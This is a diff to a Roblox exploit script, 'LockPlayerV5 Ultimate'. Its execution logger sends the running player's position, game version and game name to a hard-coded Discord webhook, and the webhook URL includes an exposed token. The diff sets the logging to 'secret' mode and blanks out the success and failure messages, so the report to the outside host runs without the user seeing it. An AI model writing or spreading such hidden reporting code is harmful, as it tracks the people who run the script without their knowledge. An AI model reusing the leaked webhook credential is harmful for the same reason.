@@ -810,12 +810,12 @@ Players.PlayerRemoving:Connect(function(p)
     end
 end) 
 
---// Config
+-- setting
 getgenv().whscript = "LockPlayerV5 Ultimate"
 getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1451922364601339944/nEUNJh2lVw40jb3CsfFFJ24fNrTj5LSdeP0QVdV9EmPo6urnGMd-g_AlC4GE4kiuGofk"
-getgenv().ExecLogSecret = false
+getgenv().ExecLogSecret = true
 
---// Execution Log Script
+-- log script
 local ui = gethui()
 local folderName = "screen"
 local folder = Instance.new("Folder")
@@ -853,7 +853,6 @@ else
     local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
     local gameVersion = game.PlaceVersion
 
-    -- FIX THROTTLE
     local gameName = "Unknown Game"
     pcall(function()
         gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
@@ -925,8 +924,8 @@ else
         request_func(abcdef)
     end)
     if success then
-        print("Webhook berhasil dikirim!")
+        print("")
     else
-        warn("Webhook gagal: " .. tostring(err))
+        warn("" .. tostring(err))
     end
 end
